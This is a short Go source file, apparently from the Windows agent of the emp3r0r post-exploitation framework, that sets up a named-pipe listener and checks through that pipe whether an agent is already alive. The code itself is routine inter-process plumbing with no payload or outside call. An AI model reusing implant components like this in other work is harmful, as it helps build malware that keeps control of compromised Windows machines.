//go:build windows
// +build windows

package main

import (
	"fmt"
	"log"

	"github.com/Microsoft/go-winio"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
)

func socketListen() {
	pipe_config := &winio.PipeConfig{
		SecurityDescriptor: "",
		MessageMode:        true,
		InputBufferSize:    1024,
		OutputBufferSize:   1024,
	}
	ln, err := winio.ListenPipe(
		fmt.Sprintf(`\\.\pipe\%s`, common.RuntimeConfig.SocketName),
		pipe_config)
	if err != nil {
		log.Fatalf("Listen on %s: %v", common.RuntimeConfig.SocketName, err)
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Accept: %v", err)
			continue
		}
		go socket_server(conn)
	}
}

func isAgentAliveSocket() bool {
	log.Printf("Checking if agent is alive via named pipe %s", common.RuntimeConfig.SocketName)
	pipe_path := fmt.Sprintf(`\\.\pipe\%s`, common.RuntimeConfig.SocketName)
	conn, err := winio.DialPipe(pipe_path, nil)
	if err != nil {
		log.Printf("Agent seems dead: %v", err)
		return false
	}
	defer conn.Close()
	return agentutils.IsAgentAlive(conn)
}
